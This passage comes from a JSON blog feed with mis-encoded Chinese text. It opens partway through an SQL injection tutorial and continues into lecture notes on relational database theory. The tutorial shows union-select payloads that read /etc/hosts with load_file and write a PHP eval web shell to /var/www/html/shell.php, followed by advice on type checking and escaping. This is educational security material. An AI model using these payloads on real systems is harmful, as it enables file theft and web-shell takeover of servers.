load_file(&#39;&#x2F;ect&#x2F;hosts&#39;)\nå¦‚æœæœ‰å•å¼•å·è¿‡æ»¤ï¼Œè¿˜å¯ä»¥å¯¹æ–‡ä»¶ååå…­è¿›åˆ¶\n?id&#x3D;-1 union select load_file(0x2f6563742f686f737473)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>ä¹Ÿå¯ä»¥å†™æ–‡ä»¶</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_post[1]);?>'</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/shell.php'</span>\næˆ–è€…\n?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> unhex<span class=\"token punctuation\">(</span>ä¸€å¥è¯çš„<span class=\"token number\">16</span>è¿›åˆ¶<span class=\"token punctuation\">)</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/shell.php'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"sqlæ³¨å…¥çš„é˜²å¾¡\"><a class=\"anchor\" href=\"#sqlæ³¨å…¥çš„é˜²å¾¡\">#</a> sql æ³¨å…¥çš„é˜²å¾¡</h2>\n<p>å¯¹äºä¸€ä¸ªä¿¡å®‰çš„å­¦ç”Ÿæ¥è®²ï¼Œå­¦ä¹ è¿™äº›æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ sql æ¼æ´è¢«åˆ©ç”¨ï¼Œé‚£ä¹ˆå°±ä¸å¾—ä¸æåˆ°æ€ä¹ˆå»é˜²å¾¡ sql æ³¨å…¥</p>\n<p>é¦–å…ˆæˆ‘ä»¬è¦æ˜ç¡®è¿™æ ·ä¸€ä¸ªæ¦‚å¿µï¼Œæ•°æ®åº“åªåšäº†æ‰§è¡Œ sql è¯­å¥çš„ä½œç”¨ï¼Œå¯¹äºæ•°æ®åº“æœ¬èº«æ¥è¯´æ²¡æœ‰ä»€ä¹ˆåŠæ³•æ¥é˜²æ­¢ sql æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥ä»æ“çºµæ•°æ®åº“çš„è¯­è¨€ç€æ‰‹</p>\n<p>é˜²å¾¡æ–¹æ³•ä¸»è¦åˆ†ä¸ºä¸¤ç§</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">æ•°æ®ç±»å‹åˆ¤æ–­å’Œç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h3 id=\"ä¸¥æ ¼çš„æ•°æ®ç±»å‹\"><a class=\"anchor\" href=\"#ä¸¥æ ¼çš„æ•°æ®ç±»å‹\">#</a> ä¸¥æ ¼çš„æ•°æ®ç±»å‹</h3>\n<p>å¦‚ java å’Œ C# è¿™ç§å¼ºç±»å‹çš„è¯­è¨€å‡ ä¹ä¸ç”¨è€ƒè™‘æ•°å­—å‹æ³¨å…¥ï¼Œå¦‚æœå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œä¸€æ¬¡æ•°æ®ç±»å‹çš„è½¬åŒ–ï¼Œå½“ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²æ—¶å°±ä¼šè¿”å› Exception è€Œä¸ä¼šæ‰§è¡Œ sql è¯­å¥</p>\n<p>å¦‚æœå† php æˆ–è€… ASP è¿™ç§æ²¡æœ‰å¼ºåˆ¶è¦æ±‚å¤„ç†æ•°æ®ç±»å‹çš„è¯­è¨€ï¼Œå½“ä¼ å…¥ä¸€ä¸ªå‚æ•°æ—¶ä¼šè‡ªåŠ¨æ ¹æ®å‚æ•°æ¨å¯¼å‡ºæ•°æ®ç±»å‹ï¼Œå‡è®¾ id=1ï¼Œåˆ™æ¨å¯¼å‡ºæ•°æ®ç±»å‹ä¸º Integerã€id=strï¼Œåˆ™æ¨å¯¼å‡º ID çš„æ•°æ®ç±»å‹ä¸º string</p>\n<p>é˜²å¾¡æ•°å­—å‹çš„æ³¨å…¥ç›¸å¯¹æ¥è¯´è¦ç®€å•ï¼Œåªè¦åœ¨ç¨‹åºä¸­è¿›è¡Œæ•°æ®ç±»å‹çš„åˆ¤æ–­å³å¯</p>\n<h3 id=\"ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰\"><a class=\"anchor\" href=\"#ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰\">#</a> ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰</h3>\n<p>é€šè¿‡åŠ å¼ºæ•°æ®ç±»å‹éªŒè¯å¯ä»¥è§£å†³æ•°å­—å‹çš„ SQL æ³¨å…¥ï¼Œä½†æ˜¯å­—ç¬¦å‹çš„ SQL æ³¨å…¥å´ä¸è¡Œå› ä¸ºå­—ç¬¦å‹å°±æ˜¯ string ç±»å‹çš„ï¼Œæ‰€ä»¥å°±æ— æ³•åˆ¤æ–­è¾“å…¥æ˜¯å¦æ˜¯æ¶æ„æ”»å‡»ï¼Œé‚£ä¹ˆæœ€å¥½çš„åŠæ³•å°±æ˜¯å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œåœ¨æŸ¥è¯¢ä»»æ„å­—ç¬¦éƒ½éœ€è¦å•å¼•å·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é—­åˆå•å¼•å·æ¥é˜²å¾¡ sql æ³¨å…¥</p>\n",
            "tags": [
                "Web",
                "SQLæ³¨å…¥"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "url": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "title": "å…³ç³»æ•°æ®åº“",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h2 id=\"21å…³ç³»æ•°æ®åº“ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰\"><a class=\"anchor\" href=\"#21å…³ç³»æ•°æ®åº“ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰\">#</a> 2.1 å…³ç³»æ•°æ®åº“ç»“æ„åŠå½¢å¼åŒ–å®šä¹‰</h2>\n<h3 id=\"211å…³ç³»\"><a class=\"anchor\" href=\"#211å…³ç³»\">#</a> 2.1.1 å…³ç³»</h3>\n<p>å•ä¸€çš„æ•°æ®ç»“æ„ -- å…³ç³»</p>\n<ul>\n<li>ç°å®ä¸–ç•Œçš„å®ä½“ä»¥åŠå®ä½“ä¹‹é—´çš„å…³ç³»å‡ç”¨å…³ç³»æ¥è¡¨ç¤º</li>\n</ul>\n<p>é€»è¾‘ç»“æ„ --- äºŒç»´è¡¨</p>\n<ul>\n<li>ä»ç”¨æˆ·è§’åº¦ï¼Œå…³ç³»æ¨¡å‹ä¸­æ•°æ®çš„é€»è¾‘ç»“æ„æ˜¯ä¸€å¼ äºŒç»´è¡¨</li>\n</ul>\n<h4 id=\"åŸŸ\"><a class=\"anchor\" href=\"#åŸŸ\">#</a> åŸŸ</h4>\n<p>åŸŸæ˜¯ä¸€ç»„å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„å€¼çš„é›†åˆ</p>\n<ul>\n<li>æ•´æ•°ã€å®æ•°ã€è‡ªç„¶æ•°</li>\n<li>æŸä¸€ä¸ªèŒƒå›´çš„æ•°</li>\n<li>æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²é›†åˆ</li>\n<li â€™ç”·â€˜ï¼Œâ€˜å¥³â€™=\"\"></li>\n</ul>\n<h4 id=\"ç¬›å¡å°”ç§¯\"><a class=\"anchor\" href=\"#ç¬›å¡å°”ç§¯\">#</a> ç¬›å¡å°”ç§¯</h4>\n<ul>\n<li>\n<p>ç¬›å¡å°”ç§¯</p>\n<p>ç»™å®šä¸€ç»„åŸŸ D1ï¼ŒD2ï¼Œâ€¦ï¼ŒDnï¼Œè¿™äº›åŸŸä¸­å¯ä»¥æœ‰ç›¸åŒçš„ã€‚    D1ï¼ŒD2ï¼Œâ€¦ï¼ŒDn çš„ç¬›å¡å°”ç§¯ä¸ºï¼š    D1Ã—D2Ã—â€¦Ã—Dn ï¼ ï½›ï¼ˆd1ï¼Œd2ï¼Œâ€¦ï¼Œdnï¼‰ï½œdiïƒDiï¼Œiï¼1ï¼Œ2ï¼Œâ€¦ï¼Œn</p>\n<ol>\n<li>æ‰€æœ‰åŸŸçš„æ‰€æœ‰å–å€¼çš„ä¸€ä¸ªç»„åˆ</li>\n<li>ä¸èƒ½é‡å¤</li>\n</ol>\n</li>\n<li>\n<p>å…ƒç»„</p>\n<p>ç¬›å¡å°”ç§¯ä¸­æ¯ä¸€ä¸ªå…ƒç´ ï¼ˆd1ï¼Œd2ï¼Œâ€¦ï¼Œdnï¼‰å«ä½œä¸€ä¸ª n å…ƒç»„ï¼ˆn-tupleï¼‰æˆ–ç®€ç§°å…ƒç»„ (Tuple)</p>\n</li>\n<li>\n<p>åˆ†é‡</p>\n<p>ç¬›å¡å°”ç§¯å…ƒç´ ï¼ˆd1ï¼Œd2ï¼Œâ€¦ï¼Œdnï¼‰ä¸­çš„æ¯ä¸€ä¸ªå€¼ di å«ä½œä¸€ä¸ªåˆ†é‡</p>\n</li>\n<li>\n<p>åŸºæ•°</p>\n<p>è‹¥ Diï¼ˆiï¼1ï¼Œ2ï¼Œâ€¦ï¼Œnï¼‰ä¸ºæœ‰é™é›†ï¼Œå…¶åŸºæ•° (åŸŸä¸­æ‰€åŒ…å«çš„å€¼çš„ä¸ªæ•°) ä¸º miï¼ˆiï¼1ï¼Œ2ï¼Œâ€¦ï¼Œnï¼‰ï¼Œåˆ™ D1Ã—D2Ã—â€¦Ã—Dn çš„åŸºæ•° M ä¸ºï¼š</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png\" alt=\"image-20220918183227871\" /></p>\n</li>\n<li>\n<p>ç¬›å¡å°”ç§¯çš„è¡¨ç¤ºæ–¹æ³•</p>\n<ul>\n<li>ç¬›å¡å°”ç§¯å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªäºŒç»´è¡¨</li>\n<li>è¡¨ä¸­çš„æ¯è¡Œå¯¹åº”ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ä¸­çš„æ¯åˆ—å¯¹åº”ä¸€ä¸ªåŸŸ</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"å…³ç³»\"><a class=\"anchor\" href=\"#å…³ç³»\">#</a> å…³ç³»</h4>\n<ol>\n<li>\n<p>å…³ç³»<br />\n D1Ã—D2Ã—â€¦Ã—Dn çš„å­é›†å«ä½œåœ¨åŸŸ D1ï¼ŒD2ï¼Œâ€¦ï¼ŒDn ä¸Šçš„å…³ç³»ï¼Œè¡¨ç¤ºä¸º ï¼š<br />\nRï¼ˆD1ï¼ŒD2ï¼Œâ€¦ï¼ŒDnï¼‰</p>\n<ul>\n<li>\n<p>å…³ç³»å</p>\n</li>\n<li>\n<p>å…³ç³»çš„ç›®æˆ–è€…åº¦</p>\n</li>\n</ul>\n</li>\n<li>\n<p>å•å…ƒå…³ç³»äºäºŒå…ƒå…³ç³»</p>\n<ul>\n<li>å½“ n=1 æ—¶ï¼Œç§°è¯¥å…³ç³»ä¸ºå•å…ƒå…³ç³»æˆ–è€…ä¸€å…ƒå…³ç³»</li>\n</ul>\n</li>\n<li>\n<p>å…³ç³»çš„è¡¨ç¤º</p>\n<p>å…³ç³»ä¹Ÿæ˜¯ä¸€ä¸ªäºŒç»´è¡¨ï¼Œè¡¨çš„æ¯è¡Œå¯¹åº”ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨çš„æ¯åˆ—å¯¹åº”ä¸€ä¸ªåŸŸ</p>\n</li>\n<li>\n<p>å±æ€§</p>\n<ul>\n<li>å…³ç³»ä¸­ä¸åŒåˆ—å¯ä»¥å¯¹åº”ç›¸åŒçš„åŸŸ</li>\n<li>ä¸ºäº†åŠ ä»¥åŒºåˆ†ï¼Œå¿…é¡»å¯¹æ¯åˆ—èµ·ä¸€ä¸ªåå­—ï¼Œç§°ä¸ºå±æ€§ï¼ˆAttributeï¼‰å</li>\n<li>n ç›®å…³ç³»å¿…æœ‰ n ä¸ªå±æ€§</li>\n</ul>\n</li>\n<li>\n<p>ç </p>\n<ul>\n<li>å€™é€‰ç ï¼ˆCandidate keyï¼‰ï¼šè‹¥å…³ç³»ä¸­çš„æŸä¸€å±æ€§ç»„çš„å€¼èƒ½å”¯ä¸€åœ°æ ‡è¯†ä¸€ä¸ªå…ƒç»„ï¼Œåˆ™ç§°è¯¥å±æ€§ç»„ä¸ºå€™é€‰ç </li>\n<li>å…¨ç ï¼ˆAll-keyï¼‰ï¼šå…³ç³»æ¨¡å¼çš„æ‰€æœ‰å±æ€§æ˜¯è¿™ä¸ªå…³ç³»æ¨¡å¼çš„å€™é€‰ç ï¼Œç§°ä¸ºå…¨ç </li>\n<li>ä¸»ç ï¼ˆPrimary keyï¼‰ï¼šè‹¥ä¸€ä¸ªå…³ç³»æœ‰å¤šä¸ªå€™é€‰ç ï¼Œåˆ™é€‰å®šå…¶ä¸­ä¸€ä¸ªä¸ºä¸»ç </li>\n<li>å¤–éƒ¨ç ï¼šä¸æ˜¯å½“å‰å…³ç³»çš„ç ï¼Œä½†æ˜¯å…¶å®ƒå…³ç³»çš„ä¸»ç </li>\n<li>ä¸»å±æ€§ï¼šåŒ…å«åœ¨ä»»ä½•å€™é€‰ç ä¸­çš„å±æ€§ç§°ä¸ºä¸»å±æ€§ã€‚</li>\n<li>éä¸»å±æ€§ï¼šä¸åŒ…å«åœ¨ä»»ä½•ä¾¯é€‰ç ä¸­çš„å±æ€§ç§°ä¸ºéä¸»å±æ€§ï¼ˆ Non-Prime attributeï¼‰æˆ–éç å±æ€§ï¼ˆNon-key attributeï¼‰</li>\n</ul>\n</li>\n<li>\n<p>ä¸‰ç±»å…³ç³»</p>\n<ul>\n<li>\n<p>åŸºæœ¬å…³ç³»ï¼ˆåŸºæœ¬è¡¨æˆ–è€…åŸºè¡¨ï¼‰</p>\n<p>å®é™…å­˜åœ¨çš„è¡¨ï¼Œæ˜¯å®é™…å­˜å‚¨æ•°æ®çš„é€»è¾‘è¡¨ç¤º</p>\n</li>\n<li>\n<p>æŸ¥è¯¢è¡¨</p>\n<p>æŸ¥è¯¢ç»“æœå¯¹åº”çš„è¡¨</p>\n</li>\n<li>\n<p>è§†å›¾è¡¨</p>\n<p>ç”±åŸºæœ¬è¡¨æˆ–è€…å…¶ä»–è¯†å›¾è¡¨å¯¼å‡ºçš„è¡¨ï¼Œæ˜¯è™šè¡¨ï¼Œä¸å¯¹åº”å®é™…çš„æ•°æ®</p>\n</li>\n</ul>\n</li>\n<li>\n<p>åŸºæœ¬å…³ç³»çš„æ€§è´¨</p>\n<ul>\n<li>åˆ—æ˜¯åŒè´¨çš„</li>\n<li>ä¸åŒçš„åˆ—å¯ä»¥å‡ºè‡ªä¸€ä¸ªåŸŸ<br />\nå…¶ä¸­æ¯ä¸ªåˆ—ç§°ä¸ºä¸€ä¸ªå±æ€§<br />\nä¸åŒçš„å±æ€§è¦ç»™ä¸ä¸åŒçš„å±æ€§å</li>\n<li>åˆ—çš„é¡ºåºæ— æ‰€è°“ï¼Œåˆ—çš„æ¬¡åºå¯ä»¥ä»»æ„äº¤æ¢</li>\n<li>ä»»æ„ä¸¤ä¸ªå…ƒç»„çš„å€™é€‰ç ä¸èƒ½ç›¸åŒ</li>\n<li>è¡Œçš„é¡ºåºæ— æ‰€è°“ï¼Œè¡Œçš„æ¬¡åºå¯ä»¥ä»»æ„äº¤æ¢</li>\n<li>åˆ†é‡å¿…é¡»å–åŸå­å€¼ï¼ˆæœ€åŸºæœ¬çš„ï¼‰</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"222-å…³ç³»æ¨¡å¼\"><a class=\"anchor\" href=\"#222-å…³ç³»æ¨¡å¼\">#</a> 2.2.2ã€å…³ç³»æ¨¡å¼</h3>\n<h4 id=\"ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å‹\"><a class=\"anchor\" href=\"#ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å‹\">#</a> ä»€ä¹ˆæ˜¯å…³ç³»æ¨¡å‹</h4>\n<p>å…³ç³»æ¨¡å¼ï¼ˆå‹ï¼‰</p>\n<ul>\n<li>å¯¹å…³ç³»çš„æè¿°</li>\n<li>é™æ€çš„ç¨³å®šçš„</li>\n</ul>\n<p>å…³ç³»ï¼ˆå€¼ï¼‰</p>\n<ul>\n<li>å…³ç³»æ¨¡å¼åœ¨æŸä¸€ä¸ªæ—¶åˆ»çš„çŠ¶æ€æˆ–è€…å†…å®¹</li>\n<li>åŠ¨æ€çš„ï¼Œéšæ—¶é—´å˜åŒ–çš„</li>\n</ul>\n<p>å…³ç³»æ˜¯å…ƒç»„çš„é›†åˆï¼Œå› æ­¤å…³ç³»æ¨¡å¼å¿…é¡»æŒ‡å‡ºè¿™ä¸ªå…ƒç»„é›†åˆçš„ç»“æ„ï¼Œå³å®ƒç”±å“ªäº›ç»„æˆï¼Œè¿™äº›å±æ€§æ¥è‡ªå“ªäº›åŸŸï¼Œä»¥åŠå±æ€§ä¸åŸŸä¹‹é—´çš„æ˜ åƒå…³ç³»ã€‚</p>\n<h4 id=\"å®šä¹‰å…³ç³»æ¨¡å‹\"><a class=\"anchor\" href=\"#å®šä¹‰å…³ç³»æ¨¡å‹\">#</a> å®šä¹‰å…³ç³»æ¨¡å‹</h4>\n<p>å…³ç³»æ¨¡å¼å¯ä»¥å½¢å¼åŒ–çš„è¡¨ç¤ºä¸ºï¼š</p>\n<p>â€‹\tRï¼ˆUï¼ŒDï¼ŒDOMï¼ŒFï¼‰</p>\n<ul>\n<li>\n<p>R       å…³ç³»å</p>\n</li>\n<li>\n<p>U       ç»„æˆè¯¥å…³ç³»çš„å±æ€§åé›†åˆ</p>\n</li>\n<li>\n<p>D       å±æ€§ç»„ U ä¸­å±æ€§æ‰€æ¥è‡ªçš„åŸŸ</p>\n</li>\n<li>\n<p>DOM  å±æ€§å‘åŸŸçš„æ˜ è±¡é›†åˆ</p>\n</li>\n<li>\n<p>F        å±æ€§é—´çš„æ•°æ®ä¾èµ–å…³ç³»é›†åˆ</p>\n</li>\n</ul>\n<p>å…³ç³»å®šä¹‰æ¨¡å¼é€šå¸¸å¯ä»¥ç®€è®°ä¸º</p>\n<p>R(U)</p>\n<p>å…³ç³»æ¨¡å¼ä½•å…³ç³»å¾€å¾€ç»Ÿç§°ä¸ºå…³ç³»</p>\n<h4 id=\"å…³ç³»æ¨¡å‹çš„å­˜å‚¨ç»“æ„\"><a class=\"anchor\" href=\"#å…³ç³»æ¨¡å‹çš„å­˜å‚¨ç»“æ„\">#</a> å…³ç³»æ¨¡å‹çš„å­˜å‚¨ç»“æ„</h4>\n<ul>\n<li>å…³ç³»æ¨¡å‹çš„é€»è¾‘ç»“æ„ - è¡¨</li>\n<li>å…³ç³»æ¨¡å‹çš„ç‰©ç†ç»“æ„\n<ol>\n<li>æœ‰çš„å…³ç³»æ•°æ®åº“ç®¡ç†ä¸­ä¸€ä¸ªè¡¨å¯¹åº”ä¸€ä¸ªæ“ä½œç³»ç»Ÿæ–‡ä»¶ï¼Œå°†ç‰©ç†æ•°æ®ç»„ç»‡äº¤ç»™æ“ä½œç³»ç»Ÿå®Œæˆï¼›</li>\n<li>æœ‰çš„å…³ç³»æ•°æ®åº“ç³»ç»Ÿä»æ“ä½œç³»ç»Ÿé‚£é‡Œç”³è¯·è‹¥å¹²ä¸ªå¤§çš„æ–‡ä»¶ï¼Œè‡ªå·±åˆ’åˆ†æ–‡ä»¶ç©ºé—´ï¼Œç»„ç»‡è¡¨ï¼Œç´¢å¼•ç­‰å­˜å‚¨ç»“æ„ï¼Œå¹¶è¿›è¡Œå­˜å‚¨ç®¡ç†ã€‚</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"223å…³ç³»æ•°æ®åº“\"><a class=\"anchor\" href=\"#223å…³ç³»æ•°æ®åº“\">#</a> 2.2.3 å…³ç³»æ•°æ®åº“</h3>\n<p>åœ¨ä¸€ä¸ªç»™å®šçš„åº”ç”¨é¢†åŸŸä¸­ï¼Œæ‰€æœ‰å…³ç³»çš„é›†åˆæ„æˆä¸€ä¸ªå…³ç³»æ•°æ®åº“</p>\n<p>å…³ç³»æ•°æ®åº“ä¹Ÿæœ‰å‹å’Œå€¼ä¹‹åˆ†</p>\n<h2 id=\"22å…³ç³»æ“ä½œ\"><a class=\"anchor\" href=\"#22å…³ç³»æ“ä½œ\">#</a> 2.2 å…³ç³»æ“ä½œ</h2>\n<h3 id=\"221-åŸºæœ¬å…³ç³»æ“ä½œ\"><a class=\"anchor\" href=\"#221-åŸºæœ¬å…³ç³»æ“ä½œ\">#</a> 2.2.1ã€åŸºæœ¬å…³ç³»æ“ä½œ</h3>\n<ol>\n<li>å¸¸ç”¨çš„å…³ç³»æ“ä½œ\n<ul>\n<li>æŸ¥è¯¢ï¼šé€‰æ‹©ã€æŠ•å½±ã€è¿æ¥ã€é™¤ã€å¹¶ã€äº¤ã€å·®ã€ç¬›å¡å°”ç§¯</li>\n<li>æ•°æ®æ›´æ–°ï¼šæ’å…¥ã€åˆ é™¤ã€ä¿®æ”¹</li>\n<li>é€‰æ‹©ã€æŠ•å½±ã€å¹¶ã€å·®ã€ç¬›å¡å°”ç§¯æ˜¯ 5 ç§åŸºæœ¬æ“ä½œ</li>\n</ul>\n</li>\n<li>å…³ç³»æ“ä½œçš„ç‰¹ç‚¹\n<ul>\n<li>é›†åˆæ“ä½œæ–¹å¼ï¼šæ“ä½œçš„å¯¹è±¡å’Œç»“æœéƒ½æ˜¯é›†åˆï¼Œä¸€æ¬¡ä¸€é›†åˆçš„æ–¹å¼</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"222-å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±»\"><a class=\"anchor\" href=\"#222-å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±»\">#</a> 2.2.2ã€å…³ç³»æ•°æ®åº“è¯­è¨€çš„åˆ†ç±»</h3>\n<ol>\n<li>\n<p>å…³ç³»ä»£æ•°è¯­è¨€</p>\n<ul>\n<li>ç”¨å¯¹å…³ç³»çš„è¿ç®—æ¥è¡¨è¾¾æŸ¥è¯¢è¦æ±‚</li>\n<li>ä»£è¡¨ ISBL</li>\n</ul>\n</li>\n<li>\n<p>å…³ç³»æ¼”ç®—è¯­è¨€ï¼šç”¨è°“è¯æ¥è¡¨è¾¾æŸ¥è¯¢è¦æ±‚</p>\n<ul>\n<li>\n<p>å…ƒç»„å…³ç³»æ¼”ç®—è¯­è¨€<br />\nè°“è¯å˜å…ƒçš„åŸºæœ¬å¯¹è±¡æ˜¯å…ƒç»„å˜é‡</p>\n<p>ä»£è¡¨ï¼šAPLHA, QUEL</p>\n</li>\n<li>\n<p>åŸŸå…³ç³»æ¼”ç®—è¯­è¨€</p>\n<p>è°“è¯å˜å…ƒçš„åŸºæœ¬å¯¹è±¡æ˜¯åŸŸå˜é‡</p>\n<p>ä»£è¡¨ï¼šQBE</p>\n</li>\n</ul>\n</li>\n<li>\n<p>ä»‹äºå…³ç³»ä»£æ•°ä½•å…³ç³»æ¼”ç®—ä¹‹é—´çš„è¯­è¨€</p>\n<ul>\n<li>ä»£è¡¨ SQL</li>\n</ul>\n</li>\n</ol>\n<p>æ¯ä¸€ä¸ª ISBL è¯­å¥éƒ½è¿‘ä¼¼äºå…³ç³»ä»£æ•°è¡¨è¾¾å¼<br />\nå…³ç³»ä»£æ•°ã€å…³ç³»æ¼”ç®—è¯­è¨€å‡æ˜¯æŠ½è±¡çš„æŸ¥è¯¢è¯­è¨€ï¼Œè¿™äº›æŠ½è±¡çš„è¯­è¨€ä¸å…·ä½“çš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¸­å®ç°çš„å®é™…è¯­è¨€å¹¶ä¸å®Œå…¨ä¸€æ ·ã€‚ä½†å®ƒä»¬èƒ½ç”¨ä½œè¯„ä¼°å®é™…ç³»ç»Ÿä¸­æŸ¥è¯¢è¯­è¨€èƒ½åŠ›çš„æ ‡å‡†æˆ–åŸºç¡€ã€‚</p>\n<h2 id=\"23å…³ç³»çš„å®Œæ•´æ€§\"><a class=\"anchor\" href=\"#23å…³ç³»çš„å®Œæ•´æ€§\">#</a> 2.3 å…³ç³»çš„å®Œæ•´æ€§</h2>\n<h3 id=\"231-å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ\"><a class=\"anchor\" href=\"#231-å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ\">#</a> 2.3.1 å…³ç³»çš„ä¸‰ç±»å®Œæ•´æ€§çº¦æŸ</h3>\n<ol>\n<li>å®ä½“å®Œæ•´æ€§ä½•å‚ç…§å®Œæ•´æ€§<br />\nå…³ç³»æ¨¡å‹å¿…é¡»æ»¡è¶³çš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶ï¼Œç§°ä¸ºå…³ç³»çš„ä¸¤ä¸ªä¸å˜æ€§ï¼Œåº”è¯¥ç”±å…³ç³»ç³»ç»Ÿè‡ªåŠ¨æ”¯æŒ</li>\n<li>ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§<br />\nåº”ç”¨é¢†åŸŸéœ€è¦éµå¾ªçš„çº¦æŸæ¡ä»¶ï¼Œä½“ç°äº†å…·ä½“é¢†åŸŸä¸­çš„è¯­ä¹‰çº¦æŸ</li>\n</ol>\n<h3 id=\"232-å®ä½“å®Œæ•´æ€§\"><a class=\"anchor\" href=\"#232-å®ä½“å®Œæ•´æ€§\">#</a> 2.3.2 å®ä½“å®Œæ•´æ€§</h3>\n<p>(1) å®ä½“å®Œæ•´æ€§è§„åˆ™æ˜¯é’ˆå¯¹åŸºæœ¬å…³ç³»è€Œè¨€çš„ã€‚ä¸€ä¸ªåŸºæœ¬è¡¨é€šå¸¸å¯¹åº”ç°å®ä¸–ç•Œçš„ä¸€ä¸ªå®ä½“é›†ã€‚</p>\n<p>(2) ç°å®ä¸–ç•Œä¸­çš„å®ä½“æ˜¯å¯åŒºåˆ†çš„ï¼Œå³å®ƒä»¬å…·æœ‰æŸç§å”¯ä¸€æ€§æ ‡è¯†ã€‚</p>\n<p>(3) å…³ç³»æ¨¡å‹ä¸­ä»¥ä¸»ç ä½œä¸ºå”¯ä¸€æ€§æ ‡è¯†ã€‚</p>\n<p>(4) ä¸»ç ä¸­çš„å±æ€§å³ä¸»å±æ€§ä¸èƒ½å–ç©ºå€¼ã€‚</p>\n<h3 id=\"233-å‚ç…§å®Œæ•´æ€§\"><a class=\"anchor\" href=\"#233-å‚ç…§å®Œæ•´æ€§\">#</a> 2.3.3 å‚ç…§å®Œæ•´æ€§</h3>\n<ol>\n<li>\n<p>å…³ç³»é—´çš„å¼•ç”¨</p>\n<p>åœ¨å…³ç³»æ¨¡å‹ä¸­å®ä½“åŠå®ä½“é—´çš„è”ç³»éƒ½æ˜¯ç”¨å…³ç³»æ¥æ     è¿°çš„ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨ç€å…³ç³»ä¸å…³ç³»é—´çš„å¼•ç”¨ã€‚</p>\n</li>\n<li>\n<p>å¤–ç <br />\nå¤–ç ï¼šè®¾ F æ˜¯åŸºæœ¬å…³ç³» R çš„ä¸€ä¸ªæˆ–ä¸€ç»„å±æ€§ï¼Œä½†ä¸æ˜¯å…³ç³» R çš„ç ã€‚å¦‚æœ F ä¸åŸºæœ¬å…³ç³» S çš„ä¸»ç  Ks ç›¸å¯¹åº”ï¼Œåˆ™ç§° F æ˜¯åŸºæœ¬å…³ç³» R çš„å¤–ç ã€‚</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">åŸºæœ¬å…³ç³»Rç§°ä¸ºå‚ç…§å…³ç³»\nåŸºæœ¬å…³ç³»Sç§°ä¸ºè¢«å‚ç…§å…³ç³»æˆ–ç›®æ ‡å…³ç³»<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>å‚ç…§å®Œæ•´æ€§è§„åˆ™<br />\nè‹¥å±æ€§ï¼ˆæˆ–å±æ€§ç»„ï¼‰F æ˜¯åŸºæœ¬å…³ç³» R çš„å¤–ç ï¼Œå®ƒä¸åŸºæœ¬å…³ç³» S çš„ä¸»ç  Ks ç›¸å¯¹åº”ï¼ˆåŸºæœ¬å…³ç³» R å’Œ S ä¸ä¸€å®šæ˜¯ä¸åŒçš„å…³ç³»ï¼‰ï¼Œåˆ™å¯¹äº R ä¸­æ¯ä¸ªå…ƒç»„åœ¨ F ä¸Šçš„å€¼å¿…é¡»ä¸ºï¼š<br />\næˆ–è€…å–ç©ºå€¼ï¼ˆF çš„æ¯ä¸ªå±æ€§å€¼å‡ä¸ºç©ºå€¼ï¼‰<br />\næˆ–è€…ç­‰äº S ä¸­æŸä¸ªå…ƒç»„çš„ä¸»ç 